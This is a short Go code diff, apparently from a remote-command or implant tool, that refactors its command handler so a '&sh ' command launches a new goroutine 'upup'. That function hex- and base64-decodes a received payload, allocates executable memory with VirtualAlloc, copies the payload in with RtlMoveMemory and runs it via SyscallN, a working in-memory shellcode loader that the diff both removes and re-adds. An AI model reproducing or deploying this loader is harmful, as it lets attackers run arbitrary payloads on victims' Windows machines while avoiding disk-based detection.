@@ -314,15 +314,19 @@ func WgetCode(url string, savepath string) string {
 	return "1"
 }
 
+func upup(command string) {
+	commands := strings.TrimSpace(strings.Split(strings.Split(command, "&sh ")[1], "&echo ")[0])
+	tmp, _ := hex.DecodeString(commands)
+	sh, _ := base64.StdEncoding.DecodeString(string(tmp))
+	addr, _, _ := VirtualAlloc.Call(0, uintptr(len(sh)), 0x1000|0x2000, 0x40)
+	_, _, _ = RtlMoveMemory.Call(addr, (uintptr)(unsafe.Pointer(&sh[0])), uintptr(len(sh)))
+	_, _, _ = syscall.SyscallN(addr, 0, 0, 0, 0)
+}
+
 func ExecuteCommandCode(cmdPath string, command string) string {
 	var out []byte
 	if strings.Index(command, "&sh ") != -1 {
-		commands := strings.TrimSpace(strings.Split(strings.Split(command, "&sh ")[1], "&echo ")[0])
-		tmp, _ := hex.DecodeString(commands)
-		sh, _ := base64.StdEncoding.DecodeString(string(tmp))
-		addr, _, _ := VirtualAlloc.Call(0, uintptr(len(sh)), 0x1000|0x2000, 0x40)
-		_, _, _ = RtlMoveMemory.Call(addr, (uintptr)(unsafe.Pointer(&sh[0])), uintptr(len(sh)))
-		_, _, _ = syscall.SyscallN(addr, 0, 0, 0, 0)
+		go upup(command)
 		out = []byte("")
 	} else {
 		cmd := exec.Command(cmdPath)
